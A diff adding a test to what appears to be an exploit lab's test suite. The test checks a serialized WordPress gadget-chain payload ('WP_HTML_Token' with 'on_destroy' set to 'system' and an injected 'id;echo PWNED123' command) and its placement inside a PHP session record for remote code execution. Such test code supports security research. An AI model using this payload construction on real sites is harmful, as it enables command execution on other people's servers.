@@ -283,3 +283,28 @@ def test_remote_payload_big_geometry():
         assert e - remote.P_START + 130 < lab.L1
     finally:
         lab.set_geometry("small")
+
+
+def test_wp_gadget_payload():
+    """The wordpress chain plants WordPress's OWN class (PHPGGC RCE2)."""
+    lab.set_geometry("big")
+    lab.set_gadget("wordpress", "id;echo PWNED123")
+    try:
+        b = lab.obj_bytes()
+        assert b == (b'evil|O:13:"WP_HTML_Token":2:{s:13:"bookmark_name";'
+                     b's:16:"id;echo PWNED123";s:10:"on_destroy";'
+                     b's:6:"system";}')
+        # the plant machinery must still fit the record into the bio:
+        # SUFFIX first (it closes R's filename at E'), then the gadget
+        p_start = (len(SYNTH_PROGRESS) + len(b"bio|s:")
+                   + len(str(lab.L1)) + len(':"'))
+        payload = lab.build_payload(p_start, lab.e_offset())
+        assert len(payload) == lab.L1
+        rel = lab.e_offset() - p_start
+        assert payload[rel:rel + len(lab.SUFFIX)] == lab.SUFFIX
+        obj_at = rel + len(lab.SUFFIX)
+        assert payload[obj_at:obj_at + len(b)] == b
+        lab.verify_c(SYNTH_PROGRESS + f'bio|s:{lab.L1}:"'.encode()
+                     + payload + b'";', p_start, lab.e_offset(), payload)
+    finally:
+        lab.set_gadget("filecache")
